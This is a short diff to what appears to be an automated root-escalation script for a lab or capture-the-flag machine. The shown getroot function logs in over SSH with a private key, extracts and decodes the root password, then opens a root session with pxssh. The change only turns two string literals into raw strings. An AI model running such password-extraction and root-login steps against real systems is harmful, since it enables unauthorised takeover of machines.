@@ -247,8 +247,8 @@ def getroot():
     output = subprocess.check_output('ssh -i srvadm_id_rsa srvadm@10.10.10.186 "' + extract_password + '"', shell=True)
     root = str(output)[39:-31]
     log("Extracting password")
-    root = root.replace("%26", "&")
-    root = root.replace("%3F", "?")
+    root = root.replace(r"%26", "&")
+    root = root.replace(r"%3F", "?")
     log("password Found " + root)
     s = pxssh.pxssh()
     if not s.login('10.10.10.186', 'root', root, sync_multiplier=5, auto_prompt_reset=False):
